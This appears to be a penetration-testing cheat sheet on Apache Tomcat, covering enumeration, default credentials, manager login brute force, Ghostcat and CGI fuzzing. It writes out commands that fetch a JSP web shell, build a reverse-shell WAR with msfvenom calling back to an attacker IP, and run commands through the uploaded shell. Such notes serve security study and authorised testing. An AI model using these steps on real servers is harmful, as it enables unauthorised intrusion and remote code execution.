# Tomcat

{% hint style="info" %}
An open-source web server that hosts applications written in Java. Tomcat was initially designed to run Java Servlets and Java Server Pages (JSP) scripts. However, its popularity increased in Java-based frameworks and is now widely used by frameworks such as Spring and tools such as Gradle.
{% endhint %}

## Discovery <a href="#tomcat-discovery-enumeration" id="tomcat-discovery-enumeration"></a>

* Tomcat servers can be identified by the Server header in the HTTP response. If the server is operating behind a reverse proxy, requesting an invalid page should reveal the server and version.
* Another method of detecting a Tomcat server and version is through the `/docs` page.
  * `curl -s http://<URL>:8080/docs/ | grep Tomcat`&#x20;

<details>

<summary>General Folder Structure</summary>

<div><figure><img src="../.gitbook/assets/Tomcat - Folder Structure.png" alt=""><figcaption></figcaption></figure> <figure><img src="../.gitbook/assets/Tomcat - WebApp Structure.png" alt=""><figcaption></figcaption></figure></div>

</details>

* The `bin` folder stores scripts and binaries needed to start and run a Tomcat server.
* The `conf` folder stores various configuration files used by Tomcat.
* The `tomcat-users.xml` file stores user credentials and their assigned roles.
* The `lib` folder holds the various JAR files needed for the correct functioning of Tomcat.
* The `logs` and `temp` folders store temporary log files.
* The `webapps` folder is the default webroot of Tomcat and hosts all the applications.
* The `work` folder acts as a cache and is used to store data during runtime.
* The **most important** file among these is `WEB-INF/web.xml`, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes.
* All compiled classes used by the application should be stored in the `WEB-INF/classes` folder. These classes might contain important business logic as well as sensitive information.
* The `lib` folder stores the libraries needed by that particular application. The `jsp` folder stores [Jakarta Server Pages (JSP)](https://en.wikipedia.org/wiki/Jakarta_Server_Pages), formerly known as `JavaServer Pages`&#x20;
* The `tomcat-users.xml` file is used to allow or disallow access to the `/manager` and `host-manager` admin pages.
* The file shows us what each of the roles `manager-gui`, `manager-script`, `manager-jmx`, and `manager-status` provide access to.

## Enumeration <a href="#tomcat-discovery-enumeration" id="tomcat-discovery-enumeration"></a>

* Default Credentials - tomcat/tomcat, admin/admin
* `nmap -p- -sC -Pn <IP/CIDR> --open`
* Fuzz the paths or directories
  * `gobuster dir -u http://<URL>:8180/ -w directory-list-2.3-small.txt`&#x20;
* We can try a password brute force attack against the login page.
* If we are successful in logging in, we can upload a [Web Application Resource or Web Application ARchive (WAR)](https://en.wikipedia.org/wiki/WAR_\(file_format\)) file containing a JSP web shell and obtain remote code execution on the Tomcat server.

## Exploitation

### Tomcat Manager - Login Brute Force <a href="#tomcat-manager-login-brute-force" id="tomcat-manager-login-brute-force"></a>

* Use the [auxiliary/scanner/http/tomcat\_mgr\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/) Metasploit module

### Tomcat Manager - WAR File Upload <a href="#tomcat-manager-war-file-upload" id="tomcat-manager-war-file-upload"></a>

* Many Tomcat installations provide a GUI interface to manage the application. which is available at `/manager/html` by default Only users assigned the `manager-gui` role are allowed to access.
* Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application.
* &#x20;A [JSP web shell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp) or [SecurityRiskAdvisors-cmd.jsp](https://github.com/SecurityRiskAdvisors/cmd.jsp) can be downloaded and placed within the archive.
  * `wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp`  -> `zip -r backup.war cmd.jsp`&#x20;
  * `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Attacker-IP> LPORT=<Attacker-Port> -f war -o backup.war`
* Click on `Browse` to select the .war file and then click on `Deploy`.
* `curl http://<URL>l:8180/backup/cmd.jsp?cmd=id`&#x20;
* The [multi/http/tomcat\_mgr\_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) Metasploit module can be used to automate the process

### CVE-2020-1938 : Ghostcat <a href="#cve-2020-1938-ghostcat" id="cve-2020-1938-ghostcat"></a>

* The AJP service is usually running at port 8009 on a Tomcat server.

### Attacking Tomcat CGI

* The CGI Servlet is a vital component of Apache Tomcat that enables web servers to communicate with external applications beyond the Tomcat JVM.
* These external applications are typically CGI scripts written in languages like Perl, Python, or Bash. The CGI Servlet receives requests from web browsers and forwards them to CGI scripts for processing.
* CGI Servlet is a program that runs on a web server, such as Apache2, to support the execution of external applications that conform to the CGI specification. It is a middleware between web servers and external information resources like databases.
* **Find a CGI script**
  * `ffuf -w common.txt:FUZZ -u http://<IP>:8080/cgi/FUZZ.cmd`
  * `ffuf -w common.txt:FUZZ -u http://<IP>:8080/cgi/FUZZ.bat`
* Leverage known exploits based on version
